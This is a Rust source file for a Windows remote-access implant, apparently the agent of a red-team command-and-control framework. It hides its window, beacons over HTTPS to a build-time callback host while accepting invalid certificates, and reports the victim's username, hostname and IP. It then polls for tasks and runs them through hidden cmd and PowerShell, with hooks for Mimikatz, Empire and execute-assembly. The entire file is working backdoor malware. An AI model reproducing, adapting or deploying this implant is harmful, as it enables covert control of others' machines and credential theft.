#![windows_subsystem = "windows"]
// above declaration keeps the window hidden

// imports
use std::os::windows::process::CommandExt;
use std::time::Duration;
use std::thread::sleep;
use serde::{Serialize, Deserialize};

mod nonstd;

// structs
#[derive(Debug, Serialize, Deserialize)]
pub struct RegisterLink {
    pub link_username:     String,
    pub link_hostname:     String,
    pub internal_ip:        String,
    pub external_ip:        String,
    pub pid:                u32,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Task {
    pub q:                  String,
    pub tasking:            String,
    pub x_request_id:       String,
}

// UM link
fn main() {
    link_loop();
}

fn link_loop() {
    let ua = user_link();
    let client = reqwest::blocking::Client::builder()
        .user_agent(ua)
        .cookie_store(true)
        .danger_accept_invalid_certs(true)
        //.http2_prior_knowledge()
        .build().unwrap();
    // SECURITY
    // encrypted callback string with env var at build
    let callback = env!("CALLBACK").to_string();
    let step1_cb = format!("https://{}/js", callback);
    let step2_cb = format!("https://{}/static/register", callback);
    let step3_cb = format!("https://{}/static/get", callback);
    // keep retrying to reach C2
    loop {
        //let step1 = client.get("https://10.0.2.2:8443/js").send();
        let step1 = client.get(step1_cb.as_str()).send();
        match step1 {
            Ok(_) => break,
            Err(_) => continue,
        }
    }
    let register_link = RegisterLink {
            link_username: username(),
            link_hostname: hostname(),
            internal_ip: internal_ip().unwrap(),
            external_ip: String::new(),
            pid: pid(),
    };
    let mut uresp: reqwest::blocking::Response;
    loop {  
        //let resp = client.post("https://10.0.2.2:8443/static/register")
        let resp = client.post(step2_cb.as_str())
            .json(&register_link)
            .send();
        match resp {
            Ok(_) => {
                uresp = resp.unwrap();
                break
            },
            Err(_) => continue,
        }
    }
    let mut recv_task: Task = uresp.json().unwrap();

    // link loop
    let mut send_task = Task {            
        q:              String::from(""),
        tasking:        String::from(""),
        x_request_id:   String::from(""),
    };
    loop {
        // poll
        //let resp = client.post("https://10.0.2.2:8443/static/get")
        let resp = client.post(step3_cb.as_str())
            .header("x-request-id", recv_task.x_request_id.clone())
            .json(&send_task)
            .send();
        match resp {
            Ok(_) => (),
            Err(_) => continue,
        }
        uresp = resp.unwrap();
        recv_task = uresp.json().unwrap();
        send_task.q = String::new();
        send_task.tasking = String::new();

        if recv_task.tasking.len() > 0 {
            // time to exec the command
            send_task.q = link_command(recv_task.q);
            send_task.tasking = recv_task.tasking;
            recv_task.q = String::new();
            recv_task.tasking = String::new();
            // no need to wait after a task
            continue;
        }
        // this should be defined by server with jitter and delay
        sleep(Duration::from_secs(3));
    }
}

fn link_command(command: String) -> String {
    // DEBUG AGENT
    let arg_split = command.as_str().split(' ');
    let args = arg_split.collect::<Vec<&str>>();
    // the args should all be changed for better opsec
    match args[0] {
        "execute-assembly"  => nonstd::execute_assembly(args),
        "empire"            => nonstd::empire(args),
        "mimikatz"          => nonstd::mimikatz(args),
        "cmd"               => command_spawn(args),
        "shell"             => shell(args),
        "powershell"        => powershell(args),
        "cd"                => cd(args),
        "pwd"               => pwd(),
        "ls"                => ls(args),
        "pid"               => pid().to_string(),
        "whoami"            => String::from(format!("{}\\{}", hostname(), username())),
        "integrity"         => integrity(),
        "exit"              => std::process::exit(0),
        _                   => String::from(format!("not a command")),
    }
}

fn shell(args: Vec<&str>) -> String {
    if args.len() < 1 {
        return String::from("")
    }
    let output = std::process::Command::new(args[1])
        .args(&args[2..])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
    match output {
        Ok(output) => { return String::from(format!("{}{}", 
            String::from_utf8(output.stdout).unwrap(), 
            String::from_utf8(output.stderr).unwrap()))
        },
        Err(_) => return String::from("command not found"),
    }
}

fn command_spawn(args: Vec<&str>) -> String {
    if args.len() < 1 {
        return String::from("")
    } 
    let command_string = args[1..].join(" ");
    let command = command_string.as_str();
    let output = std::process::Command::new("cmd")
        .args(&["/C", command])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
    match output {
        Ok(output) => { return String::from(format!("{}{}", 
            String::from_utf8(output.stdout).unwrap(), 
            String::from_utf8(output.stderr).unwrap()))
        },
        Err(_) => return String::from("command not found"),
    }
}

fn powershell(args: Vec<&str>) -> String {
    if args.len() < 1 {
        return String::from("")
    } 
    let command_string = args[1..].join(" ");
    let output = std::process::Command::new("powershell")
        .args(&["-noP", "-sta", "-w", "1", command_string.as_str()])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output()
        .expect("Could not execute");
    String::from(format!("{}{}", 
        String::from_utf8(output.stdout).unwrap(), 
        String::from_utf8(output.stderr).unwrap()))
}

fn ls(args: Vec<&str>) -> String {
    let mut directory = ".";
    if args.len() > 1 {
        directory = args[1];
    } 
    let read = std::fs::read_dir(directory);
    let mut output: Vec<String> = Vec::new();
    if read.is_ok() {
        for path in read.unwrap() {
            if let Ok(entry) = path {
                // get more metadata and format correctly
                // file and folder perms
                if let Ok(metadata) = entry.metadata() {
                    output.push(String::from(format!("{:100}    {}", entry.path().display(), metadata.len())));
                } else {
                    output.push(String::from(format!("{}", entry.path().display())));
                }
            }
        }
    } else {
        return String::from(format!("Could not ls: {:?}", read.err().unwrap()))
    }
    output.join("\n")
}

fn pwd() -> String {
    if let Ok(current) = std::env::current_dir() {
        return String::from(format!("{}", current.display()))
    } else {
        return String::from("Could not get current directory")
    }
}

fn cd(args: Vec<&str>) -> String {
    if args.len() > 1 {
        if std::env::set_current_dir(args[1]).is_ok() {
            return String::from(args[1])
        } else {
            return String::from("Could not change directory")
        }
    } else {
        return String::from("")
    }
}

fn username() -> String {
	let mut name = [0; 256];
	let mut size = 256;
	unsafe {
        winapi::um::winbase::GetUserNameW(&mut name[0], &mut size);
    }
	String::from_utf16_lossy(&name[..size as usize])
}

fn hostname() -> String {
	let mut name = [0; 256];
	let mut size = 256;
	unsafe {
		winapi::um::winbase::GetComputerNameW(&mut name[0], &mut size);
	}
	String::from_utf16_lossy(&name[..size as usize])
}

fn internal_ip() -> Option<String> {
    // thanks https://github.com/egmkang/local_ipaddress/
    use std::net::UdpSocket;
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(_) => return None,
    };
    match socket.connect("8.8.8.8:80") {
        Ok(()) => (),
        Err(_) => return None,
    };
    match socket.local_addr() {
        Ok(addr) => return Some(addr.ip().to_string()),
        Err(_) => return None,
    };
}

fn pid() -> u32 {
    std::process::id()
}

fn integrity() -> String {
    // TODO
    // Low      (SID: S-1-16-4096)
    // Medium   (SID: S-1-16-8192)
    // High     (SID: S-1-16-12288)
    // System   (SID: S-1-16-16384)
    if username().to_lowercase() == "system" {
        return "System".to_string()
    }
    "Medium".to_string()
}

// TODO
// dynamic with build env var
fn user_link() -> String {
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko".to_string()
}
